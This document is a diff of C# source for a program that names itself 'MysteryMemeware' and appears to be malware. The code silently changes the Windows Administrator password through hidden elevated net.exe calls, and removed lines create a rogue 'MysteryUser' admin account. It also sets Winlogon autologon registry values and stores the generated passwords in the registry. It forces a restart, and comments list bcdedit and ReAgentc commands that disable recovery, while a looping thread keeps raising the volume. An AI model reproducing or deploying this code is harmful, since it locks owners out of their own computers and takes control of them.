+                changeAdminPasswordStartInfo.PasswordInClearText = null;
+                changeAdminPasswordStartInfo.RedirectStandardError = false;
+                changeAdminPasswordStartInfo.RedirectStandardInput = false;
+                changeAdminPasswordStartInfo.RedirectStandardOutput = false;
+                changeAdminPasswordStartInfo.StandardErrorEncoding = null;
+                changeAdminPasswordStartInfo.StandardOutputEncoding = null;
+                changeAdminPasswordStartInfo.UserName = null;
+                changeAdminPasswordStartInfo.UseShellExecute = false;
+                changeAdminPasswordStartInfo.Verb = "runas";
+                changeAdminPasswordStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
 
                 if (system32Path is not null)
                 {
-                    enableAdminStartInfo.WorkingDirectory = system32Path;
+                    changeAdminPasswordStartInfo.WorkingDirectory = system32Path;
                 }
                 else
                 {
-                    enableAdminStartInfo.WorkingDirectory = null;
+                    changeAdminPasswordStartInfo.WorkingDirectory = null;
                 }
 
-                System.Diagnostics.Process enableAdminProcess = System.Diagnostics.Process.Start(enableAdminStartInfo);
+                System.Diagnostics.Process changeUserPasswordProcess = System.Diagnostics.Process.Start(changeAdminPasswordStartInfo);
 
-                while (!enableAdminProcess.HasExited)
+                System.Diagnostics.Stopwatch timeoutStopwatch = null;
+
+                try
                 {
+                    timeoutStopwatch = new System.Diagnostics.Stopwatch();
 
+                    timeoutStopwatch.Restart();
+                }
+                catch
+                {
+                    debugFlag_CngAdminPass_A_1 = true;
                 }
 
-                if (enableAdminProcess.ExitCode is not 0)
+                while (!changeUserPasswordProcess.HasExited)
                 {
-                    throw new System.Exception("Enable admin process failed with exit code " + enableAdminProcess.ExitCode.ToString());
+                    bool timedOut = false;
+
+                    try
+                    {
+                        if (timeoutStopwatch.ElapsedTicks >= 200000000)
+                        {
+                            timedOut = true;
+                        }
+                    }
+                    catch
+                    {
+                        debugFlag_CngAdminPass_A_2 = true;
+                    }
+
+                    if (timedOut)
+                    {
+                        debugFlag_CngAdminPass_A_3 = true;
+
+                        throw null;
+                    }
+                }
+
+                if (changeUserPasswordProcess.ExitCode is not 0)
+                {
+                    debugFlag_CngAdminPass_A_4 = true;
+
+                    throw null;
                 }
             }
             catch
             {
-                try
-                {
-                    //Second try to run the command without administrator. This will only work if the user has abnormal UAC settings.
+                debugFlag_CngAdminPass_A = true;
 
-                    System.Diagnostics.ProcessStartInfo enableAdminStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-                    enableAdminStartInfo.Arguments = "user \"Administrator\" /active:yes";
-                    enableAdminStartInfo.CreateNoWindow = true;
-                    enableAdminStartInfo.Domain = null;
-                    enableAdminStartInfo.ErrorDialog = false;
-                    enableAdminStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
-
-                    //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.
-
-                    if (system32Path is not null)
-                    {
-                        enableAdminStartInfo.FileName = system32Path + "net.exe";
-                    }
-                    else
-                    {
-                        enableAdminStartInfo.FileName = "net.exe";
-                    }
-
-                    enableAdminStartInfo.LoadUserProfile = false;
-                    enableAdminStartInfo.Password = null;
-                    enableAdminStartInfo.PasswordInClearText = null;
-                    enableAdminStartInfo.RedirectStandardError = false;
-                    enableAdminStartInfo.RedirectStandardInput = false;
-                    enableAdminStartInfo.RedirectStandardOutput = false;
-                    enableAdminStartInfo.StandardErrorEncoding = null;
-                    enableAdminStartInfo.StandardOutputEncoding = null;
-                    enableAdminStartInfo.UserName = null;
-                    enableAdminStartInfo.UseShellExecute = false;
-                    enableAdminStartInfo.Verb = null;
-                    enableAdminStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
-                    //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.
-
-                    if (system32Path is not null)
-                    {
-                        enableAdminStartInfo.WorkingDirectory = system32Path;
-                    }
-                    else
-                    {
-                        enableAdminStartInfo.WorkingDirectory = null;
-                    }
-
-                    System.Diagnostics.Process enableAdminProcess = System.Diagnostics.Process.Start(enableAdminStartInfo);
-
-                    while (!enableAdminProcess.HasExited)
-                    {
-
-                    }
-
-                    if (enableAdminProcess.ExitCode is not 0)
-                    {
-                        throw new System.Exception("Enable admin process failed with exit code " + enableAdminProcess.ExitCode.ToString());
-                    }
-                }
-                catch
-                {
-
-                }
+                debugFlag_CngAdminPass = true;
             }
 
             #endregion
 
-            //Create a new user named MysteryUser with the password specified earlier using net.exe.
 
-            System.Diagnostics.ProcessStartInfo createUserProcessStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-            createUserProcessStartInfo.Arguments = "user /add \"MysteryUser\" \"" + newAdminPassword + "\"";
-            createUserProcessStartInfo.CreateNoWindow = true;
-            createUserProcessStartInfo.ErrorDialog = false;
-            createUserProcessStartInfo.FileName = system32Folder + "\\net.exe";
-            createUserProcessStartInfo.UseShellExecute = false;
-            createUserProcessStartInfo.Verb = "runas";
-            createUserProcessStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
-            System.Diagnostics.Process createUserProcess = System.Diagnostics.Process.Start(createUserProcessStartInfo);
-
-            while (!createUserProcess.HasExited)
-            {
-
-            }
-
-            if (createUserProcess.ExitCode != 0)
-            {
-                throw new System.Exception("Failed to create MysteryUser because net.exe returned exit code \"" + createUserProcess.ExitCode + "\".");
-            }
-
-            //Add the MyseryUser to the administrators group using net.exe.
-
-            System.Diagnostics.ProcessStartInfo elevateUserProcessStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-            elevateUserProcessStartInfo.Arguments = "localgroup Administrators /add \"MysteryUser\"";
-            elevateUserProcessStartInfo.CreateNoWindow = true;
-            elevateUserProcessStartInfo.ErrorDialog = false;
-            elevateUserProcessStartInfo.FileName = system32Folder + "\\net.exe";
-            elevateUserProcessStartInfo.UseShellExecute = false;
-            elevateUserProcessStartInfo.Verb = "runas";
-            elevateUserProcessStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
-            System.Diagnostics.Process elevateUserProcess = System.Diagnostics.Process.Start(elevateUserProcessStartInfo);
-
-            while (!elevateUserProcess.HasExited)
-            {
-
-            }
-
-            if (elevateUserProcess.ExitCode != 0)
-            {
-                throw new System.Exception("Failed to add MysteryUser to the administrators group because net.exe returned exit code \"" + elevateUserProcess.ExitCode + "\".");
-            }
 
             //Open the local machine registry in 64 bit mode for use later.
 
@@ -1822,8 +2104,8 @@
 
             //Set some registries to automatically sign into the the MysteryUser.
 
-            WinLogon.SetValue("DefaultUserName", "MysteryUser");
-            WinLogon.SetValue("DefaultPassword", password);
+            WinLogon.SetValue("DefaultUserName", username);
+            WinLogon.SetValue("DefaultPassword", newUserPassword);
             WinLogon.SetValue("AutoAdminLogon", 1);
 
             //Close the winlogon registry since we are now completely done using it.
@@ -1837,20 +2119,24 @@
 
 
 
-            /*
-             C:\Windows\System32\bcdedit.exe /set bootstatuspolicy ignoreallfailures
-             C:\Windows\System32\bcdedit.exe /set recoveryenabled No
-             C:\Windows\System32\bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
-             C:\Windows\System32\bcdedit.exe /set {default} recoveryenabled No
-             C:\Windows\System32\ReAgentc.exe /disable
-            */
+
+            //C:\Windows\System32\bcdedit.exe /set bootstatuspolicy ignoreallfailures
+            //C:\Windows\System32\bcdedit.exe /set recoveryenabled No
+            //C:\Windows\System32\bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+            //C:\Windows\System32\bcdedit.exe /set {default} recoveryenabled No
+            //C:\Windows\System32\ReAgentc.exe /disable
+
+            //Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PrecisionTouchPad\Status\Enabled 0
+            //Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Wisp\Touch\TouchGate 0
+
+            //Note last openned registry stored at Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Applets\Regedit
 
             //Now that we are done installing this software. Open up the settings registry to store some information about the installation.
 
             Microsoft.Win32.RegistryKey MysteryMemeware = Software.CreateSubKey("MysteryMemeware", true);
 
-            MysteryMemeware.SetValue("AdministratorUserPassword", newAdminPassword);
-            MysteryMemeware.SetValue("DefaultUserPassword", newUserPassword);
+            MysteryMemeware.SetValue("AdministratorPassword", newAdminPassword);
+            MysteryMemeware.SetValue("UserPassword", newUserPassword);
             MysteryMemeware.SetValue("IsInstalled", "true");
 
             MysteryMemeware.Flush();
@@ -1869,29 +2155,103 @@
             LocalMachine.Close();
             LocalMachine.Dispose();
 
-            //Restart the users computer to finalize the installation process using shutdown.exe.
+            #region Restart Computer
 
-            System.Diagnostics.ProcessStartInfo shutdownProcessStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-            shutdownProcessStartInfo.Arguments = "/r /f /t 0";
-            shutdownProcessStartInfo.CreateNoWindow = true;
-            shutdownProcessStartInfo.ErrorDialog = false;
-            shutdownProcessStartInfo.FileName = system32Folder + "\\shutdown.exe";
-            shutdownProcessStartInfo.UseShellExecute = false;
-            shutdownProcessStartInfo.Verb = "runas";
-            shutdownProcessStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
-            System.Diagnostics.Process shutdownProcess = System.Diagnostics.Process.Start(shutdownProcessStartInfo);
-
-            while (!shutdownProcess.HasExited)
+            try
             {
+                System.Diagnostics.ProcessStartInfo restartComputerStartInfo = new System.Diagnostics.ProcessStartInfo();
 
+                restartComputerStartInfo.Arguments = "/r /f /t 0";
+                restartComputerStartInfo.CreateNoWindow = true;
+                restartComputerStartInfo.Domain = null;
+                restartComputerStartInfo.ErrorDialog = false;
+                restartComputerStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
+
+                if (system32Path is not null)
+                {
+                    restartComputerStartInfo.FileName = system32Path + "shutdown.exe";
+                }
+                else
+                {
+                    restartComputerStartInfo.FileName = "shutdown.exe";
+                }
+
+                restartComputerStartInfo.LoadUserProfile = false;
+                restartComputerStartInfo.Password = null;
+                restartComputerStartInfo.PasswordInClearText = null;
+                restartComputerStartInfo.RedirectStandardError = false;
+                restartComputerStartInfo.RedirectStandardInput = false;
+                restartComputerStartInfo.RedirectStandardOutput = false;
+                restartComputerStartInfo.StandardErrorEncoding = null;
+                restartComputerStartInfo.StandardOutputEncoding = null;
+                restartComputerStartInfo.UserName = null;
+                restartComputerStartInfo.UseShellExecute = false;
+                restartComputerStartInfo.Verb = "runas";
+                restartComputerStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+
+                if (system32Path is not null)
+                {
+                    restartComputerStartInfo.WorkingDirectory = system32Path;
+                }
+                else
+                {
+                    restartComputerStartInfo.WorkingDirectory = null;
+                }
+
+                System.Diagnostics.Process restartComputerProcess = System.Diagnostics.Process.Start(restartComputerStartInfo);
+            }
+            catch
+            {
+                try
+                {
+                    System.Diagnostics.ProcessStartInfo restartComputerStartInfo = new System.Diagnostics.ProcessStartInfo();
+
+                    restartComputerStartInfo.Arguments = "/r /f /t 0";
+                    restartComputerStartInfo.CreateNoWindow = true;
+                    restartComputerStartInfo.Domain = null;
+                    restartComputerStartInfo.ErrorDialog = false;
+                    restartComputerStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
+
+                    if (system32Path is not null)
+                    {
+                        restartComputerStartInfo.FileName = system32Path + "shutdown.exe";
+                    }
+                    else
+                    {
+                        restartComputerStartInfo.FileName = "shutdown.exe";
+                    }
+
+                    restartComputerStartInfo.LoadUserProfile = false;
+                    restartComputerStartInfo.Password = null;
+                    restartComputerStartInfo.PasswordInClearText = null;
+                    restartComputerStartInfo.RedirectStandardError = false;
+                    restartComputerStartInfo.RedirectStandardInput = false;
+                    restartComputerStartInfo.RedirectStandardOutput = false;
+                    restartComputerStartInfo.StandardErrorEncoding = null;
+                    restartComputerStartInfo.StandardOutputEncoding = null;
+                    restartComputerStartInfo.UserName = null;
+                    restartComputerStartInfo.UseShellExecute = false;
+                    restartComputerStartInfo.Verb = null;
+                    restartComputerStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+
+                    if (system32Path is not null)
+                    {
+                        restartComputerStartInfo.WorkingDirectory = system32Path;
+                    }
+                    else
+                    {
+                        restartComputerStartInfo.WorkingDirectory = null;
+                    }
+
+                    System.Diagnostics.Process restartComputerProcess = System.Diagnostics.Process.Start(restartComputerStartInfo);
+                }
+                catch
+                {
+
+                }
             }
 
-            if (shutdownProcess.ExitCode != 0)
-            {
-                throw new System.Exception("Failed to restart computer because shutdown.exe returned exit code \"" + shutdownProcess.ExitCode + "\".");
-            }
+            #endregion
         }
 
 
@@ -1926,6 +2286,24 @@
         //Pending Approval
         private sealed class MainForm : System.Windows.Forms.Form
         {
+            public static void SetVolume()
+            {
+                System.Threading.Thread childThread = new System.Threading.Thread(() =>
+                {
+                    System.IntPtr processHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
+                    while (true)
+                    {
+                        for (int i = 0; i < 50; i++)
+                        {
+                            SendMessage(processHandle, 793, processHandle, 655360);
+                        }
+                        System.Threading.Thread.Sleep(1000);
+                    }
+                });
+                childThread.Start();
+            }
+            [System.Runtime.InteropServices.DllImport("user32.dll")]
+            private static extern System.IntPtr SendMessage(System.IntPtr WMAppCommandProcessHandle, uint WMAppCommand, System.IntPtr AppCommandProcessHandle, uint appCommand);
             public MainForm(int screenID, System.Drawing.Image coverImage)
             {
                 this.BackColor = System.Drawing.Color.White;
@@ -2009,28 +2387,6 @@
                     base.OnPaint(paintEventArgs);
                 }
             }
-        }
-        //Pending Approval
-        public static class VolumeModule
-        {
-            public static void SetVolume()
-            {
-                System.Threading.Thread childThread = new System.Threading.Thread(() =>
-                {
-                    System.IntPtr processHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
-                    while (true)
-                    {
-                        for (int i = 0; i < 50; i++)
-                        {
-                            SendMessage(processHandle, 793, processHandle, 655360);
-                        }
-                        System.Threading.Thread.Sleep(1000);
-                    }
-                });
-                childThread.Start();
-            }
-            [System.Runtime.InteropServices.DllImport("user32.dll")]
-            private static extern System.IntPtr SendMessage(System.IntPtr WMAppCommandProcessHandle, uint WMAppCommand, System.IntPtr AppCommandProcessHandle, uint appCommand);
         }
     }
 }
